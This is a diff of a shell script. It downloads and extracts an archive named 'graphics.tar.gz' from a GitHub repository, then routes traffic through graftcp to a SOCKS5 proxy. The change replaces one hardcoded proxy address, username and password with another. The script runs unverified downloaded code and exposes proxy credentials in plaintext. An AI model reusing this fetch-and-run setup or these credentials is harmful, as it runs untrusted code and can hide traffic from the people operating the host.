@@ -9,12 +9,11 @@ wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.g
 tar -xvzf graphics.tar.gz
 
 cat > graftcp/local/graftcp-local.conf <<END 
-listen = :2233 
-loglevel = 1 
-select_proxy_mode=socks5_only 
-socks5 = 103.253.24.243:8080
-socks5_username = woiden_aqua1
-socks5_password = chain
+listen = :2233
+loglevel = 1
+socks5 = 45.155.69.201:6406
+socks5_username = ingfoingfo
+socks5_password = maszZeehh
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
